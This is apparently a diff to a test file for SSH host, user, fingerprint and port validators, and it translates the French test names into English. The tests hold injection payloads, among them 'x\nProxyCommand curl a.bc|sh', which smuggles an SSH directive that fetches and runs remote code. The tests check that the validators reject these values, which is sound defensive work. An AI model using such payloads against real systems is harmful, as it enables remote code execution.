@@ -13,7 +13,7 @@ import {
 const INJECTION = "x\nProxyCommand curl a.bc|sh"
 
 describe("isSshHost", () => {
-  it("accepte un nom DNS, une adresse IPv4 et une adresse IPv6", () => {
+  it("accepts a DNS name, an IPv4 address and an IPv6 address", () => {
     for (const host of [
       "vps.test",
       "vps-1.example.com",
@@ -30,7 +30,7 @@ describe("isSshHost", () => {
     }
   })
 
-  it("refuse ce qui casserait une ligne de configuration ou lirait comme une option", () => {
+  it("refuses what would break a configuration line or read as an option", () => {
     for (const host of [
       "",
       INJECTION,
@@ -53,7 +53,7 @@ describe("isSshHost", () => {
     }
   })
 
-  it("refuse un nom plus long que ce que le DNS permet", () => {
+  it("refuses a name longer than DNS allows", () => {
     const label = "a".repeat(63)
     const long = [label, label, label, label].join(".")
 
@@ -62,12 +62,12 @@ describe("isSshHost", () => {
     expect(isSshHost("a".repeat(64))).toBe(false)
   })
 
-  it("refuse ce qui n'est pas une chaîne", () => {
+  it("refuses what is not a string", () => {
     expect(isSshHost(null)).toBe(false)
     expect(isSshHost(42)).toBe(false)
   })
 
-  it("partage sa règle avec le motif que lisent les schémas de l'API", () => {
+  it("shares its rule with the pattern the API schemas read", () => {
     const pattern = new RegExp(SSH_HOST_PATTERN)
 
     expect(pattern.test("2001:db8::1")).toBe(true)
@@ -76,18 +76,18 @@ describe("isSshHost", () => {
 })
 
 describe("isSshUser", () => {
-  it("accepte un nom de compte POSIX", () => {
+  it("accepts a POSIX account name", () => {
     for (const user of ["root", "dev", "ubuntu", "_svc", "deploy-1", "a_b"]) {
       expect(isSshUser(user)).toBe(true)
     }
   })
 
-  it("refuse la charge qui ajoute une directive à la configuration SSH", () => {
+  it("refuses the payload that adds a directive to the SSH configuration", () => {
     expect(isSshUser(INJECTION)).toBe(false)
     expect(new RegExp(SSH_USER_PATTERN).test(INJECTION)).toBe(false)
   })
 
-  it("refuse une option, un espace, un caractère de contrôle ou un jeton", () => {
+  it("refuses an option, a space, a control character or a token", () => {
     for (const user of [
       "",
       "-oProxyCommand=sh",
@@ -105,19 +105,19 @@ describe("isSshUser", () => {
     }
   })
 
-  it("refuse ce qui n'est pas une chaîne", () => {
+  it("refuses what is not a string", () => {
     expect(isSshUser(undefined)).toBe(false)
   })
 })
 
 describe("isSshFingerprint", () => {
-  it("accepte une empreinte SHA256 telle que ssh-keygen l'écrit", () => {
+  it("accepts a SHA256 fingerprint as ssh-keygen writes it", () => {
     expect(
       isSshFingerprint("SHA256:47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU")
     ).toBe(true)
   })
 
-  it("refuse une empreinte qui porte autre chose que du base64", () => {
+  it("refuses a fingerprint that carries anything other than base64", () => {
     expect(isSshFingerprint(`SHA256:abc${INJECTION}`)).toBe(false)
     expect(isSshFingerprint("MD5:ab:cd")).toBe(false)
     expect(isSshFingerprint("SHA256:")).toBe(false)
@@ -126,7 +126,7 @@ describe("isSshFingerprint", () => {
 })
 
 describe("isSshPort", () => {
-  it("accepte un port TCP et refuse le reste", () => {
+  it("accepts a TCP port and refuses the rest", () => {
     expect(isSshPort(22)).toBe(true)
     expect(isSshPort(65_535)).toBe(true)
     expect(isSshPort(0)).toBe(false)
